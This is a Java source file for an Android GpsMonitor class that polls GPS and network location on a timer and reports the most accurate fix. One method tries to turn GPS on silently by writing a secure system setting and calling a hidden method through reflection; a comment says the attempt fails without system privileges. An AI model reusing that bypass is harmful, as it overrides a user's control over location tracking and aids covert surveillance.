package com.fx.android.common.events.location;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import com.fx.dalvik.util.FxLog;

import com.fx.android.common.Customization;
import com.fx.dalvik.util.TimerBase;

public class GpsMonitor extends TimerBase {
	
//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------

	private static final String TAG = "GpsMonitor";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final long DEFAULT_REFRESH_TIME_MILLISECONDS = 60000;
	
	private static final float DEFAULT_MIN_NOTIFICATION_DISTANCE = (float) 10.;
	
	private List<Location> locationBuffer = new ArrayList<Location>();
	private Context context;
	private int counter = 0;
	
	/**
	 * The minimum time interval for notifications, in milliseconds. 
	 * This field is only used as a hint to conserve power, 
	 * and actual time between location updates may be greater or lesser than this value.
	 */
	private long minRefreshTimeMilliseconds;
	
	/**
	 * The minimum distance interval for notifications, in meters
	 */
	private float minNotificationDistance;
	
	Handler scheduleHandler = new Handler();
	
	private abstract class LocationListenerBase implements LocationListener {
		
		public abstract String getProvider();

		public void onLocationChanged(Location aLocation) {
			if (LOCAL_LOGV) FxLog.v(TAG, "onLocationChanged # ENTER ...");
			synchronized (locationBuffer) {
				if (LOCAL_LOGV) FxLog.v(TAG, "Adding location");
				locationBuffer.add(aLocation);
			}
		}

		public void onProviderDisabled(String aProvider) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onProviderDisabled # ENTER ...");
				FxLog.v(TAG, String.format("%s is disabled.", aProvider));
			}
		}

		public void onProviderEnabled(String aProvider) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onProviderEnabled # ENTER ...");
				FxLog.v(TAG, String.format("%s is enabled.", aProvider));
			}
		}

		public void onStatusChanged(String aProvider, int aStatus, Bundle aExtras) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onStatusChanged # ENTER ...");
				FxLog.v(TAG, String.format("Status of %s is changed.", aProvider));
			}
		}
		
	}
	
	private final LocationListener gpsLocationListener = new LocationListenerBase() {
		@Override
		public String getProvider() {
			return LocationManager.GPS_PROVIDER;
		}
	};
	
	private final LocationListener networkLocationListener = new LocationListenerBase() {
		@Override
		public String getProvider() {
			return LocationManager.NETWORK_PROVIDER;
		}
	};
	
	private void registerLocationUpdates() {
		if (LOCAL_LOGV) FxLog.v(TAG, "registerLocationUpdates # ENTER ...");
	
		LocationManager locationManager = 
			(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		
		// The minRefreshTimeMilliseconds is just a hint for the Android to conserve power. 
		// This timing is not reliable. 
		// So we need to create our timer to collect location update.
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 
											   minRefreshTimeMilliseconds, 
											   minNotificationDistance,
											   gpsLocationListener);
		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,
											   minRefreshTimeMilliseconds, 
											   minNotificationDistance,
											   networkLocationListener);
	}
	
	private void removeUpdates() {
		if (LOCAL_LOGV) FxLog.v(TAG, "removeLocationManager # ENTER ...");
		
		LocationManager locationManager = 
			(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		
		locationManager.removeUpdates(gpsLocationListener);
		locationManager.removeUpdates(networkLocationListener);
	}
	
	/**
	 * If the best location doesn't exist, return null. 
	 */
	/*
	private Location getBestLocation() {
		if (LOCAL_LOGV) FxLog.v(TAG, "getBestLocation # ENTER ...");
		Context aContext = Common.getContext();
		LocationManager locationManager = (LocationManager) aContext.getSystemService(Context.LOCATION_SERVICE);
		Criteria aCriteria = new Criteria();
		Location aLocation = null;
		boolean aEnabledOnly = true; // if true then only a provider that is currently enabled is returned
		String aBestProvider = locationManager.getBestProvider(aCriteria, aEnabledOnly);
		if (aBestProvider != null && aBestProvider.length() > 0) {
			//aLocation = latestLocationMap.get(aBestProvider); 
		}
		return aLocation; 
	}
	*/
	
	
	private static Location selectBestLocation(List<Location> aLocationBuffer) {
		if (LOCAL_LOGV) FxLog.v(TAG, "selectBestLocation # ENTER ...");
		Location aBestLocation = null;
		double aMinAccuracy = Double.MAX_VALUE;
		for (Location aLocation : aLocationBuffer) {
			double aAccuracy = aLocation.getAccuracy();
			if (aAccuracy < aMinAccuracy) {
				aBestLocation = aLocation;
				aMinAccuracy = aAccuracy;
			}
		}
		return aBestLocation;
	}
	
	@SuppressWarnings("unused")
	private void enableGps() {
		if (LOCAL_LOGV) FxLog.v(TAG, "enableGps # ENTER ...");
		LocationManager aLocationManager = 
			(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		boolean aGpsEnabled = aLocationManager.isProviderEnabled("gps");
		boolean aNetworkEnabled = aLocationManager.isProviderEnabled("network");
		
		if (! (aGpsEnabled || aNetworkEnabled)) {
			try {
				enableGpsProgrammatically();
			} catch (Exception e) {
				askUserToEnableGps();
			}
		}
	}

	private void enableGpsProgrammatically() {
		
		// Still doesn't work. 
		// A kind of runtime security exception is thrown.
		// Some web says the application is needed to be signed as system app to remove this error.
		
		if (LOCAL_LOGV) FxLog.v(TAG, "enableGps # ENTER ...");
	    LocationManager locationManager = 
	    	(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
	    Settings.Secure.putString(context.getContentResolver(), 
	    						  Settings.Secure.LOCATION_PROVIDERS_ALLOWED, 
	    						  LocationManager.GPS_PROVIDER);
	    
	    try {
			Method updateProvidesMethod = locationManager.getClass().getMethod("updateProviders");
			updateProvidesMethod.setAccessible(true);
			updateProvidesMethod.invoke(locationManager);
		} catch (SecurityException e) {
	    	if (LOCAL_LOGD) FxLog.d(TAG, "Cannot call updateProviders()", e);
		} catch (NoSuchMethodException e) {
	    	if (LOCAL_LOGD) FxLog.d(TAG, "Cannot call updateProviders()", e);
		} catch (IllegalArgumentException e) {
	    	if (LOCAL_LOGD) FxLog.d(TAG, "Cannot call updateProviders()", e);
		} catch (IllegalAccessException e) {
	    	if (LOCAL_LOGD) FxLog.d(TAG, "Cannot call updateProviders()", e);
		} catch (InvocationTargetException e) {
	    	if (LOCAL_LOGD) FxLog.d(TAG, "Cannot call updateProviders()", e);
		}
	}
	
	private void askUserToEnableGps() {
		if (LOCAL_LOGV) FxLog.v(TAG, "askUserToEnableGps # ENTER ...");
		Intent aIntent = new Intent("android.settings.LOCATION_SOURCE_SETTINGS");
		aIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(aIntent);
	}

	
	
//-------------------------------------------------------------------------------------------------
// PROTECTED API
//-------------------------------------------------------------------------------------------------
	
	protected void onLocationUpdated(Location aLocation, int aCounter) {
		if (LOCAL_LOGV) FxLog.v(TAG, "onLocationUpdated # ENTER ...");
	}
	
//-------------------------------------------------------------------------------------------------
// PUBLIC API
//-------------------------------------------------------------------------------------------------
	
	public GpsMonitor(Context aContext) {
		if (LOCAL_LOGV) FxLog.v(TAG, "LocationMonitor # ENTER ...");
		context = aContext;
		setTimerDurationMilliseconds(DEFAULT_REFRESH_TIME_MILLISECONDS);
		setMinNotificationDistance(DEFAULT_MIN_NOTIFICATION_DISTANCE);
	}
	
	public void setMinNotificationDistance(float aMinNotificationDistance) {
		if (LOCAL_LOGV) FxLog.v(TAG, "setMinNotificationDistance # ENTER ...");
		minNotificationDistance = aMinNotificationDistance;
	}
	
	@Override
	public void setTimerDurationMilliseconds(long aTimerDurationMilliseconds) {
		if (LOCAL_LOGV) FxLog.v(TAG, "setTimerDurationMilliseconds # ENTER ...");
		super.setTimerDurationMilliseconds(aTimerDurationMilliseconds);
		minRefreshTimeMilliseconds = aTimerDurationMilliseconds;	
	}
	
	@Override
	public void start() {
		if (LOCAL_LOGV) FxLog.v(TAG, "start # ENTER ...");
		onLocationUpdated(getBestLastKnownLocation(), ++counter);
		registerLocationUpdates();
		super.start();
	}
	
	@Override
	public void stop() {
		if (LOCAL_LOGV) FxLog.v(TAG, "stop # ENTER ...");
		removeUpdates();
		super.stop();
	}

	@Override
	public void onTimer() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onTimer # ENTER ...");
		
		// We need to keep registering it because sometimes (e.g. after reboot) when the 
		// registration failed, there is no error indicate the failure. The callback has just never 
		// been called. 
		registerLocationUpdates();
		
		synchronized (locationBuffer) {
			int aBufferSize = locationBuffer.size();
			if (aBufferSize > 0) {
				Location aBestLocation = selectBestLocation(locationBuffer);
				locationBuffer.clear();
				onLocationUpdated(aBestLocation, ++counter);
			}
		}
	}
	
	public void setCounterOffset(int aCounterOffset) {
		if (LOCAL_LOGV) FxLog.v(TAG, "setCounterOffset # ENTER ...");
		counter = aCounterOffset;
	}
	
	public Location getBestLastKnownLocation() {
		if (LOCAL_LOGV) FxLog.v(TAG, "setCounterOffset # ENTER ...");
		LocationManager aLocationManager = 
			(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

		long aTimeDiffCriteriaMilliseconds = 300000; // 5 minutes
		
		Location aGpsLocation = 
			aLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		Location aNetworkLocation = 
			aLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
		Location aBestLocation;
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("GPS Location: %s", aGpsLocation));
			FxLog.v(TAG, String.format("Network Location: %s", aNetworkLocation));
		}
		
		if (aGpsLocation == null && aNetworkLocation == null) {
			aBestLocation = null;
		} else if (aGpsLocation != null && aNetworkLocation == null) {
			aBestLocation = aGpsLocation;
		} else if (aGpsLocation == null && aNetworkLocation != null) {
			aBestLocation = aNetworkLocation;
		} else { // both are not null
			long aNetworkLocationTime = aNetworkLocation.getTime();
			long aGpsLocationTime = aGpsLocation.getTime();
			
			if (LOCAL_LOGV) {
				long aNow = System.currentTimeMillis();
				FxLog.v(TAG, String.format("Network location is %f minutes ago", 
						(aNow - aNetworkLocationTime) / (60000.)));
				FxLog.v(TAG, String.format("GPS location is %f minutes ago", 
						(aNow - aNetworkLocationTime) / (60000.)));
			}
			if (aNetworkLocationTime - aGpsLocationTime > aTimeDiffCriteriaMilliseconds) {
				aBestLocation = aNetworkLocation;
			} else {
				aBestLocation = aGpsLocation;
			}
		}
		
		return aBestLocation;
	}
	
}
